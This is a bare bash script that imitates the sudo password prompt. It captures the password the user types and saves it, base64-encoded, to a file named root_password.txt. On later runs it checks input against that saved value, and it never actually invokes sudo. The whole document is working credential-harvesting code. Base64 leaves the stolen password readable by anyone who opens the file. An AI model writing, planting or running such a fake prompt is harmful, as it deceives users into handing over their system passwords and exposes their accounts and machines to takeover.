#!/bin/bash

password_file="root_password.txt"

if [ ! -f "$password_file" ]; then
  read -s -p "[sudo] password for $(whoami): " root_password
  echo
  echo "$root_password" | base64 > "$password_file"
else
  stored_password=$(cat "$password_file" | base64 -d)
  echo -n "[sudo] password for $(whoami): "
  read -s user_input
  echo
  if [ "$user_input" != "$stored_password" ]; then
    echo ""
    exit 1
  fi
fi

echo ""
